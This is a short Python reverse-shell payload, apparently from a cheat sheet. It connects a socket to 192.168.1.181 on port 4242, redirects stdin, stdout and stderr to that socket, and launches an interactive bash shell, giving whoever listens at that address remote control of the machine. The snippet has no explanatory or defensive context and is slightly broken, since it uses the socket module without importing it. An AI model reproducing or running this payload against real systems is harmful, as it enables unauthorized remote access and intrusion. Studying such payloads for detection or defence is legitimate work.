from os import dup2
from subprocess import run
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.181", 4242))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
run(["/bin/bash", "-i"]) 